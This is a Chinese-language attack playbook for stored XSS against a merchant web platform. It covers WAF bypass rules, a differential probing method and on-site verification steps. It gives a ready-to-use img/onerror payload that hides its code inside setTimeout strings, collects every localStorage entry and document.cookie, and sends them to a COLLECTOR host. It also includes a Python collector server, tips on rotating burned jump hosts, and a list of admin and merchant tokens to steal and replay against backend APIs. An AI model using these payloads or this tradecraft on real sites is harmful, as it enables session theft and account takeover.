# WAF 放行载荷形态 × 浏览器能否执行（实测矩阵）

判据三个独立轴：**WAF 放行** / **落库原样** / **浏览器真 fire**。只看前两个 = 假阳性。

## 两层闸门：属性形态 + 语义规则（后者才是真闸门）

### 第一层 属性形态（决定浏览器能不能把载荷解析成 handler）

| 形态 | 结果 |
|---|---|
| `<img src=x onerror=…>`（空格分隔、无引号、JS 带空格） | JS 在首个空白处截断 ⇒ 语法错、静默不执行（假阳性 #1） |
| `<img/src=x/onerror=…>` | `/` 被吞进**前一个未加引号的值** ⇒ 属性根本不存在（假阳性 #2） |
| `<img/onerror="…" src=q>`（**斜杠分隔 + 引号包裹值**，值内可含空格） | ✓ 解析正常，可写正常带空格的 JS |
| 斜杠分隔 + 无引号 + JS 零空格 | ✓ 可用，但 JS 必须零空格 |

⇒ **别预设「零空格」是硬约束**：先探 WAF 是否拦引号型 handler；放行就用引号包裹，JS 照常书写、可读性高得多。
同一站点不同时期 WAF 规则会变（`on\w+="` 这类结论会失效）⇒ **属性形态必须本次实测，不许复用旧结论**。
无论哪种形态，`/` 只能用于**属性前置**（`<img/onerror=… src=x>`），写在不加引号的值后面就会被吞。

### 第二层 语义规则（属性形态再合法也过不去）

黑名单 token（平铺扫描，**字符串字面量内也扫**）：
`eval(` `atob(` `function(){` `getItem(` `Object.keys/entries/values` `JSON.stringify(`
`encodeURIComponent(` `open(` `createElement` `self[` `X['字面键']`（方括号+引号）
`location.href=` / `assign` / `replace` / `.href=` / `window.location`

语义数据流：
`location=<非字面量>`（含模板字符串 `${}`）、`location='…'+X`、`document.cookie` 参与拼接或进 DOM sink、
`d.value=<值>` 后紧跟 `z.submit()`（「填表即提交」的组合）、`for(...){…localStorage[k]…进 sink}`

实测放行：
`location='<字面量>'`、`for(k in localStorage)`（体内只做 `e.value=k` 这类无害写）、`s=localStorage[k]`（裸读入变量）、
`x=localStorage.dotKey`、`'url'+localStorage.dotKey`、`d.value=<变量>`、`z.submit()`、`z.click()`、纯 HTML 表单注入、
`a=1,b=2`、带引号属性 + 空格、**`setTimeout('<任意代码>',0)`**

## ★ 决定性破法：字符串字面量盲区（`setTimeout` = 隐式 eval）

语义分析器**只分析非字符串上下文的代码**；字符串字面量内部对它不透明。而 `setTimeout('<code>',0)` 的
字符串参数**会被当代码执行**。

**定性判据（一次定生死）**：同一段热内容 —— 裸写被拦、包进 `setTimeout('…',0)` 放行 ⇒ 字符串盲区成立。
（反例锚点：`setTimeout('x=eval(1)',0)` 仍被拦 ⇒ 黑名单 token 是平铺规则、字符串内也扫。）

可用模板：

```html
<img/onerror="setTimeout('s=\x27\x27;for(k in localStorage){s+=k+\x27=\x27+localStorage[k]+\x27|\x27}s+=document.cookie;location=\x27http://COLLECTOR:8900/x?d=\x27+s',0)" src=q>
```

可读版（便于改写）：

```js
setTimeout("s='';for(k in localStorage){s+=k+'='+localStorage[k]+'|'}s+=document.cookie;
 location='http://COLLECTOR:8900/x?d='+s", 0)
```

要点：
- JS 内单引号一律写 `\x27`：**HTML 属性不解码反斜杠** ⇒ 原样进库、原样被 JS 解析；避开属性引号嵌套
- 遍历 + 拼接 + 动态导航 + cookie 全在字符串里 ⇒ 同时绕开「导航 sink + 动态数据」与「cookie 外带」两条规则
- 目标站是 HTTPS 时仍走**顶层导航**外带（mixed content 只拦 `fetch`/`img` 这类子资源）
- 若目标 WAF 连 `setTimeout` 也拦，退一档：`unescape('%6c%6f…')` 做参数（实测可用，但 `unescape(` 单写被拦、
  包在 `setTimeout(...)` 里才过），或改表单通道（`<form action="http://COLLECTOR/x" method=get><input name=d id=d>`
  + 分离的两个 handler：`<img/onerror="d.value=…" src=q><img/onerror="z.submit()" src=q>`）

## 差分探针工作法（一步步画出闸门边界）

单变量差分：每轮只改一个 token，`save → 分类响应 → 下一发`，同轮里放一条已知放行 + 一条已知拦截当对照。

```python
def J(js):  return "<img/onerror=%s src=q>" % js            # 无引号型（JS 需零空格）
def JJ(js): return '<img/onerror="%s" src=q>' % js          # 引号型（值内可留空格）
# 分类：响应以 <!doctype 开头或含「防火墙」= WAF 拦；否则看 body 里的业务 code
```

纪律：
- 每发间隔 ~2.4s（≈1 req/s）；burst 会让整台出口 IP 被黑洞
- 探针脚本从**跳板机**跑（本机不作攻击出口）；一台出口超时/被拉黑就换下一台，用一台丢一台
- **先测放行面再拼真实动作**：`x=1`、`d.value=s`、`setTimeout('x=1',0)` 这类无害原语先落地
- 黑名单 token 用「裸写 vs 字符串内」两种形态各测一次，才能分清是 token 规则还是语义规则

## 落地校验（过 WAF 之后）

1. **读回逐字比对**：挑一个**无需鉴权**的读接口（如同一插件的 `fetchData`）把落库内容取回，`stored == sent` 才算存对。
   写字段名错误时服务端常静默忽略却回「保存成功」。
2. **本地复刻渲染路径 fire 自证**（用**读回的原始字节**，不要手抄）：
   ```html
   <script type="text/plain" id="src">…把载荷原文粘这里…</script>
   <script>
     localStorage.setItem('merchant_token','TESTMERCH');   // 先备好同源票
     document.cookie='sid=TESTCOOKIE; path=/';
     document.getElementById('modal').innerHTML = '<div class="wrap">'+document.getElementById('src').textContent+'</div>';
   </script>
   ```
   - **必须放 `<script type="text/plain">` 再读 `.textContent`**：把载荷嵌进普通 JS 字符串字面量会让 `\x27` 在
     这一层就被解码 ⇒ 载荷被改坏，自证结论无效（本轮踩过）
   - 用真 http origin（`python -m http.server`）而不是 `file://`，否则 localStorage 不可用
   - 若目标的注入入口是 `el.innerHTML = \`…${content}…\``，上面的写法等于把注入路径在原地复刻一遍
3. **收集器实收**：见下。

## 收集器骨架（跳板机自建）

```python
# coll.py —— 收到 ?d= 后 302 弹回原页；换端口起新版，不要 kill 老进程
import json, urllib.parse
from http.server import BaseHTTPRequestHandler, HTTPServer
BOUNCE = "https://<SITE>/shop/<TOKEN>"
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        q = urllib.parse.urlparse(self.path).query
        if q.startswith("d="):
            open("/root/coll.log", "a").write(urllib.parse.unquote(q[2:]) + "\n")
        self.send_response(302); self.send_header("Location", BOUNCE); self.end_headers()
    def log_message(self, *a): pass
HTTPServer(("0.0.0.0", 8900), H).serve_forever()
```
部署时**自包含**：脚本自己把 daemon 源码写盘再 `Popen(['python3', path], start_new_session=True)`，
避免上传通道把前台服务挂住。可达性必须从**另一台**机器 curl 公网 IP 才算验证（只测 `127.0.0.1` 不算）。

## 本地零请求筛形态（在送目标之前做）

```js
const probe = PAYLOAD.replace('__MARK__', 'window.__x=1');
document.body.innerHTML = probe;
console.log('FIRE?', window.__x);              // undefined = 没执行
document.body.innerHTML = '';
// 再看解析结果：属性没生成 / 被吞进前一个值，一眼就能看出
(container => { container.innerHTML = PAYLOAD; return container.innerHTML; })(document.createElement('div'));
```

批量筛候选时先在本地刷掉解析不过的，再去目标测 WAF —— 省掉一轮轮目标请求和出口 IP 消耗。

## 上传面的定性边界

白名单类结论要分清「形态」与「平台配置」：白名单若由平台 admin 配置，商户改不了（如 `jpg/jpeg/png/gif/mp3`），
且落点常是**独立 COS/OSS 域**（`static.<域>`）与应用**不同源** ⇒ 上传既不 RCE 也不 XSS。`.php` 之类通常被 WAF 直接断连。

## 取回字段清单（一次偷全，票随登录失效，早用）

`u:location.href` `c:document.cookie` `r:document.referrer`
`l:localStorage 全量` `s:sessionStorage 全量`
⇒ 同源 SPA 的 `admin-token`/`merchant_token` 都在 `localStorage`（键名可从**前端 bundle 的字面量**里直接 grep 出来，
不用猜），拿到即直接打后台 API：`Merchant-Token` / `admin-token` 头。
